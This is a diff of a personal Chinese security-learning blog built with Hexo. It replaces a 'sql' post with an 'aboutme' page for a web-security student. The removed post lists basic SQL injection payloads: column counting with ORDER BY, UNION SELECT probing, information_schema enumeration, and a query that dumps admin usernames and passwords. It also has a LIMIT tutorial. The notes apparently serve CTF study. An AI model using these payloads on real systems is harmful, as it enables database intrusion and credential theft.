@@ -7,19 +7,21 @@
   
   
   
-  <title>sql | Hexo</title>
+  <title>aboutme | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x01 sql基础语句爆字段长度Order by num  匹配字段/爆字段位置and 1=1 union select 1,2,3,4,5…… 爆所有数据名select group_concat(SCHEMA_NAME) from information_schema.schemata 爆当前库的所有表select group_concat(table_name) from informati">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql">
-<meta property="og:url" content="http://yoursite.com/2018/07/06/sql/index.html">
+  <meta name="description" content="关于我名称 :  Mr.Grim简介 :  Web安全狗专业 :  网络工程爱好 :  打游戏 and 看小可乐(侄女)联系方式 : QQ：2538951083关于博客主要记一些安全入门和ctf的wp来作为经验方便自己回顾 暂时目标: Web安全工程师">
+<meta property="og:type" content="website">
+<meta property="og:title" content="aboutme">
+<meta property="og:url" content="http://yoursite.com/about/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="0x01 sql基础语句爆字段长度Order by num  匹配字段/爆字段位置and 1=1 union select 1,2,3,4,5…… 爆所有数据名select group_concat(SCHEMA_NAME) from information_schema.schemata 爆当前库的所有表select group_concat(table_name) from informati">
+<meta property="og:description" content="关于我名称 :  Mr.Grim简介 :  Web安全狗专业 :  网络工程爱好 :  打游戏 and 看小可乐(侄女)联系方式 : QQ：2538951083关于博客主要记一些安全入门和ctf的wp来作为经验方便自己回顾 暂时目标: Web安全工程师">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-02-23T14:43:11.348Z">
+<meta property="og:image" content="http://p1vrkwaxt.bkt.clouddn.com/RO%7D%60RV%28PZOYUW6C%28%7DM5@Q26.jpg">
+<meta property="og:updated_time" content="2018-05-07T04:39:55.992Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql">
-<meta name="twitter:description" content="0x01 sql基础语句爆字段长度Order by num  匹配字段/爆字段位置and 1=1 union select 1,2,3,4,5…… 爆所有数据名select group_concat(SCHEMA_NAME) from information_schema.schemata 爆当前库的所有表select group_concat(table_name) from informati">
+<meta name="twitter:title" content="aboutme">
+<meta name="twitter:description" content="关于我名称 :  Mr.Grim简介 :  Web安全狗专业 :  网络工程爱好 :  打游戏 and 看小可乐(侄女)联系方式 : QQ：2538951083关于博客主要记一些安全入门和ctf的wp来作为经验方便自己回顾 暂时目标: Web安全工程师">
+<meta name="twitter:image" content="http://p1vrkwaxt.bkt.clouddn.com/RO%7D%60RV%28PZOYUW6C%28%7DM5@Q26.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -44,7 +46,7 @@
           fancybox: true,
           animate: true,
           isHome: false,
-          isPost: true,
+          isPost: false,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -260,11 +262,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/07/06/sql/" class="article-date">
-      <time datetime="2018-07-06T05:24:35.586Z" itemprop="datePublished">2018-07-06</time>
+      <a  href="/about/index.html" class="article-date">
+      <time datetime="2018-05-07T04:12:07.000Z" itemprop="datePublished">2018-05-07</time>
 </a>
 
     </div>
@@ -278,7 +280,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      sql
+      aboutme
     </h1>
   
 
@@ -296,15 +298,43 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x01-sql基础语句"><a href="#0x01-sql基础语句" class="headerlink" title="0x01 sql基础语句"></a>0x01 sql基础语句</h2><h3 id="爆字段长度"><a href="#爆字段长度" class="headerlink" title="爆字段长度"></a>爆字段长度</h3><p>Order by num </p>
-<h3 id="匹配字段-爆字段位置"><a href="#匹配字段-爆字段位置" class="headerlink" title="匹配字段/爆字段位置"></a>匹配字段/爆字段位置</h3><p>and 1=1 union select 1,2,3,4,5……</p>
-<h3 id="爆所有数据名"><a href="#爆所有数据名" class="headerlink" title="爆所有数据名"></a>爆所有数据名</h3><p>select group_concat(SCHEMA_NAME) from information_schema.schemata</p>
-<h3 id="爆当前库的所有表"><a href="#爆当前库的所有表" class="headerlink" title="爆当前库的所有表"></a>爆当前库的所有表</h3><p>select group_concat(table_name) from information_schema.tables where table_schema=database() </p>
-<h3 id="爆表中的字段名-将敏感的表进行16进制编码adminuser-0x61646D696E75736572"><a href="#爆表中的字段名-将敏感的表进行16进制编码adminuser-0x61646D696E75736572" class="headerlink" title="爆表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572"></a>爆表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572</h3><p>select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572</p>
-<h3 id="爆字段具体的值"><a href="#爆字段具体的值" class="headerlink" title="爆字段具体的值"></a>爆字段具体的值</h3><p>select group_concat(username,0x3a,password) from adminuser</p>
-<h2 id="0x02-sql的limit使用方法"><a href="#0x02-sql的limit使用方法" class="headerlink" title="0x02 sql的limit使用方法"></a>0x02 sql的limit使用方法</h2><p>1、下面是几种limit的方法：原则看看下面几个例子应该就懂了</p>
-<p>在数据库中很多地方都会用到，比如当你数据库查询记录有几万、几十万时使用limit查询效率非常快，只需要查询出你需要的数据就可以了·再也不用全表查询导致查询数据库崩溃的情况。</p>
-<p>select <em> from Customer LIMIT 10;–检索前10行数据，显示1-10条数据<br>select </em> from Customer LIMIT 1,10;–检索从第2行开始，累加10条id记录，共显示id为2….11<br>select <em> from Customer limit 5,10;–检索从第6行开始向前加10条数据，共显示id为6,7….15<br>select </em> from Customer limit 6,10;–检索从第7行开始向前加10条记录，显示id为7,8…16</p>
+              <style>
+    .article-meta {
+        display: none;
+    }
+    #container .article .article-title {
+        padding-right: 0;
+    }
+    .article-header {
+        padding: 0;
+        padding-top: 26px;
+        border-left: none;
+        text-align: center;
+    }
+    .article-header:hover {
+        border-left: none;
+    }
+    .article-title {
+        font-size: 1.6em
+    }
+    .article-meta {
+        display: none;
+    }
+    .article-entry hr {
+        margin: 0;
+    }
+    #container .article-info-post.article-info {
+      display: none;
+      }
+    #container .article .article-title {
+    padding: 0;
+    }
+</style>
+
+
+          
+        <h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><h3 id="名称-Mr-Grim"><a href="#名称-Mr-Grim" class="headerlink" title="名称 :  Mr.Grim"></a>名称 :  Mr.Grim</h3><h3 id="简介-Web安全狗"><a href="#简介-Web安全狗" class="headerlink" title="简介 :  Web安全狗"></a>简介 :  Web安全狗</h3><h3 id="专业-网络工程"><a href="#专业-网络工程" class="headerlink" title="专业 :  网络工程"></a>专业 :  网络工程</h3><h3 id="爱好-打游戏-and-看小可乐-侄女"><a href="#爱好-打游戏-and-看小可乐-侄女" class="headerlink" title="爱好 :  打游戏 and 看小可乐(侄女)"></a>爱好 :  打游戏 and 看小可乐(侄女)</h3><h3 id="联系方式-QQ：2538951083"><a href="#联系方式-QQ：2538951083" class="headerlink" title="联系方式 : QQ：2538951083"></a>联系方式 : QQ：2538951083</h3><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>主要记一些安全入门和ctf的wp来作为经验方便自己回顾</p>
+<h2 id="暂时目标-Web安全工程师"><a href="#暂时目标-Web安全工程师" class="headerlink" title="暂时目标: Web安全工程师"></a>暂时目标: Web安全工程师</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/RO%7D%60RV%28PZOYUW6C%28%7DM5@Q26.jpg" alt="image"></p>
 
       
     </div>
@@ -312,85 +342,11 @@
   </div>
   
     
-    <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2018/07/06/sql/">sql</a></p>
-        <p><span>文章作者:</span><a  href="/" title="访问 Mr1.Grim 的个人博客">Mr1.Grim</a></p>
-        <p><span>发布时间:</span>2018年07月06日 - 13时24分</p>
-        <p><span>最后更新:</span>2018年02月23日 - 22时43分</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/07/06/sql/" title="sql">http://yoursite.com/2018/07/06/sql/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/06/sql/　　作者: Mr1.Grim" title=""></span>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
 
-
-
-<nav id="article-nav">
-  
-    <a  href="/2018/07/06/sqlkuanzijie/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          sql宽字节注入原理
-        
-      </div>
-    </a>
-  
-  
-    <a  href="/2018/07/06/requests/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Python爬虫requests的使用</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
-  
-</nav>
 
 
   
 </article>
-
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-sql基础语句"><span class="toc-number">1.</span> <span class="toc-text">0x01 sql基础语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段长度"><span class="toc-number">1.1.</span> <span class="toc-text">爆字段长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#匹配字段-爆字段位置"><span class="toc-number">1.2.</span> <span class="toc-text">匹配字段/爆字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆所有数据名"><span class="toc-number">1.3.</span> <span class="toc-text">爆所有数据名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前库的所有表"><span class="toc-number">1.4.</span> <span class="toc-text">爆当前库的所有表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表中的字段名-将敏感的表进行16进制编码adminuser-0x61646D696E75736572"><span class="toc-number">1.5.</span> <span class="toc-text">爆表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段具体的值"><span class="toc-number">1.6.</span> <span class="toc-text">爆字段具体的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-sql的limit使用方法"><span class="toc-number">2.</span> <span class="toc-text">0x02 sql的limit使用方法</span></a></li></ol>
-</div>
-<style>
-    .left-col .switch-btn {
-        display: none;
-    }
-    .left-col .switch-area {
-        display: none;
-    }
-</style>
-<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-<script>
-    var valueHide = "隐藏目录";
-    var valueShow = "显示目录";
-    if ($(".left-col").is(":hidden")) {
-        $("#tocButton").attr("value", valueShow);
-    }
-    $("#tocButton").click(function() {
-        if ($("#toc").is(":hidden")) {
-            $("#tocButton").attr("value", valueHide);
-            $("#toc").slideDown(320);
-            $(".switch-btn, .switch-area").fadeOut(300);
-        }
-        else {
-            $("#tocButton").attr("value", valueShow);
-            $("#toc").slideUp(350);
-            $(".switch-btn, .switch-area").fadeIn(500);
-        }
-    })
-    if ($(".toc").length < 1) {
-        $("#toc, #tocButton").hide();
-        $(".switch-btn, .switch-area").show();
-    }
-</script>
-
 
 
 
@@ -423,43 +379,6 @@
     
 
 
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a  href="/2018/07/06/sqlkuanzijie/" title="上一篇: sql宽字节注入原理">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-        
-            <a  href="/2018/07/06/requests/" title="下一篇: Python爬虫requests的使用">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/基于布尔盲注的SQL/">基于布尔盲注的学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/变量覆盖漏洞/">代码审计|变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/常见文件头/">CTF常见文件头标志</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/截断问题/">PHP %00截断原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/XSS/">XSS注入原理及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/yuanma/">文件源码泄漏大全</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/xxe漏洞复现/">xxe漏洞的复现解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/关于SSR配置/">chrome 代理设置ss(ssr)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/xxe漏洞/">在JSON中玩转XXE攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo3/">网络安全实验室-注入关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo2/">网络安全实验室-脚本关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/wangluo1/">网络安全实验室-基础关</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlmap/">sqlmap基础用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/SQL约束攻击/">基于约束的SQL攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/vmheipeing/">VM一直多次黑屏问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sql报错注入/">SQL 报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlmohu/">MySql模糊查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sqlkuanzijie/">sql宽字节注入原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/sql/">sql</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/requests/">Python爬虫requests的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/saibo/">赛博地球杯工业互联网安全大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP魔术方法/">PHP之魔术方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP正则表达式/">PHP正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP漏洞总结/">PHP函数漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP文件包含漏洞/">文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP反序列化/">PHP反序列化漏洞绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/php/">PHP基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/PHP中SESSION反序列化机制/">PHP之SESSION反序列化机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/php伪协议/">PHP伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/phpruoleixing/">PHP弱类型总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/hexo/">hexo的相关配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/md5之sql注入/">MD5加密下的SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/n1ctf/">N1CTF WEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之File Upload/">DVWA之File Upload</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之SQL Injection/">DVWA之SQL Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/Jarivs oj/">Jarivs Oj Web</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之Commad injection/">DVWA之 Command Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之CSRF漏洞/">DVWA之CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/docker/">Docker复现CTF Web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DHB/">东华杯布尔盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DVWA之File Inclusion/">DVWA之File Inclusion</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/DDCTF部分wp/">DDCTF部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/CBC字节翻转攻击/">CBC字节翻转攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF 代码审计/">Bugku 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/CTFawd/">AWD 校内练习赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF misc/">bugkuCTF Misc</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/2018 iscc web/">2018 ISCC web</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/06/bugkuCTF web/">bugkuCTF Web</a></li></ul>
-    
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-    <script>
-        $(".post-list").addClass("toc-article");
-        // $(".post-list-item a").attr("target","_blank");
-        $("#post-nav-button > a:nth-child(2)").click(function() {
-            $(".fa-bars, .fa-times").toggle();
-            $(".post-list").toggle(300);
-            if ($(".toc").length > 0) {
-                $("#toc, #tocButton").toggle(200, function() {
-                    if ($(".switch-area").is(":visible")) {
-                        $("#toc, .switch-btn, .switch-area").toggle();
-                        $("#tocButton").attr("value", valueHide);
-                        }
-                    })
-            }
-            else {
-                $(".switch-btn, .switch-area").fadeToggle(300);
-            }
-        })
-    </script>
 
 
 
